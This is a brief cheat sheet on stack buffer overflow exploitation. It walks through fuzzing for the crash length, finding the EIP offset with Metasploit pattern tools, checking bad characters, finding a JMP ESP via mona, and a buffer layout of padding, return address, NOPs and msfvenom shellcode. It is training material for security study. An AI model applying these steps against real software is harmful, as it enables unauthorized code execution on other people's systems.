# Buffer Overflow

1. Determine length of overflow trigger with binary search "A"x1000
https://github.com/rosonsec/Exploits/blob/master/fuzzer.py 
Ex: Application crashes sending 1800 bytes

2. Determine exact EIP with pattern_create.rb and pattern_offset.rb
msf-pattern_create -l 1800
Use it as buffer to crash the app again
Get the EIP (xxxxxx)
msf-pattern_offset -l 1800 -q xxxxxx
Result is the offset yyyy
buffer= 'A' * yyyy + 'B' * 4 + 'C' 

3. Determine badchars to make sure the payload will be valid.
https://github.com/rosonsec/Exploits/blob/master/badchars.txt

4. Debuggers
We can use Immunity Debugger for debuggung in Windows
We can use edb for debugging in Linux (edb --run /bin/binary)

5. Develop the exploit
  Is the payload right at ESP --> JMP ESP
  Is the payload before ESP: 
    sub ESP, 200 and then JMP ESP
    or
    call [ESP-200]

Using Immunity Debugger and mona find a dll of the program being exploited:
!mona modules --> We find abcd.dll

Using Immunity Debugger and mona find an address containing the instruction JMP ESP:
Thanks to msf-nasm_shell we know the equivalent opcode for JMP ESP is FFE4
!mona find -s "\xff\xe4" -m abcd.dll 

If we don't have results we can use the JMP ESP of other processes (maybe C:\Windows\system32\USER32.dll)
F2: Set breakpoint 


6. Create payload with msfvenom making sure it fits the payload length above.
https://github.com/rosonsec/Cheatsheets/blob/master/metasploit

7. Buffer format:
buffer = "A" * yyyy + EIP + NOPs + shellcode
buffer = "A" * 235 + "\x11\x22\x33\x44" + "\x90" * 10 + shellcode
IMPORTANT: We must add some NOPs before the shellcode to let space to decode when using shikata_ga_nai

8. Exploit!
